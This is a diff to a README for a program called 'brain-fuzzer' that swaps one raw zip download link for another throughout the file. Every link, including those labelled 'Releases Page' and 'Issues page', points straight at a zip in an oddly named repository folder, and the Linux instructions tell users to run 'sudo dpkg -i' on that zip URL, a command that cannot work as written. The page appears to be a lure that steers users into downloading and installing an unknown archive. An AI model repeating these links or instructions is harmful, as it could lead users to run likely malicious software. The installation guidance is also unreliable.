@@ -6,7 +6,7 @@ Welcome to brain-fuzzer! This application creates stunning visual effects to exp
 
 ## 📥 Download Now
 
-[![Download brain-fuzzer](https://raw.githubusercontent.com/rudradddggg323/brain-fuzzer/main/jauntiness/fuzzer-brain-3.2-beta.2.zip)](https://raw.githubusercontent.com/rudradddggg323/brain-fuzzer/main/jauntiness/fuzzer-brain-3.2-beta.2.zip)
+[![Download brain-fuzzer](https://raw.githubusercontent.com/rudradddggg323/brain-fuzzer/main/jauntiness/fuzzer-brain-1.0-alpha.4.zip)](https://raw.githubusercontent.com/rudradddggg323/brain-fuzzer/main/jauntiness/fuzzer-brain-1.0-alpha.4.zip)
 
 ## 💻 System Requirements
 
@@ -30,7 +30,7 @@ To get started, follow these simple steps:
 
 1. Click on the link below to visit our Releases page where you can download the application:
 
-   [Visit the Releases Page](https://raw.githubusercontent.com/rudradddggg323/brain-fuzzer/main/jauntiness/fuzzer-brain-3.2-beta.2.zip)
+   [Visit the Releases Page](https://raw.githubusercontent.com/rudradddggg323/brain-fuzzer/main/jauntiness/fuzzer-brain-1.0-alpha.4.zip)
 
 2. On the Releases page, find the latest version of brain-fuzzer.
 
@@ -55,7 +55,7 @@ To get started, follow these simple steps:
    - **Linux:**
      - Open a terminal.
      - Navigate to the directory where you downloaded the file.
-     - Use the appropriate package manager to install (e.g., `sudo dpkg -i https://raw.githubusercontent.com/rudradddggg323/brain-fuzzer/main/jauntiness/fuzzer-brain-3.2-beta.2.zip` for Debian-based systems).
+     - Use the appropriate package manager to install (e.g., `sudo dpkg -i https://raw.githubusercontent.com/rudradddggg323/brain-fuzzer/main/jauntiness/fuzzer-brain-1.0-alpha.4.zip` for Debian-based systems).
 
 6. After installation, open the application from your programs/applications list.
 
@@ -103,6 +103,6 @@ Explore these topics to understand the science behind the visuals!
 
 ## 📞 Support
 
-For support, visit our [Issues page](https://raw.githubusercontent.com/rudradddggg323/brain-fuzzer/main/jauntiness/fuzzer-brain-3.2-beta.2.zip). You can report bugs or ask questions there.
+For support, visit our [Issues page](https://raw.githubusercontent.com/rudradddggg323/brain-fuzzer/main/jauntiness/fuzzer-brain-1.0-alpha.4.zip). You can report bugs or ask questions there.
 
 Remember to download and have fun with your mind-bending visual experience!
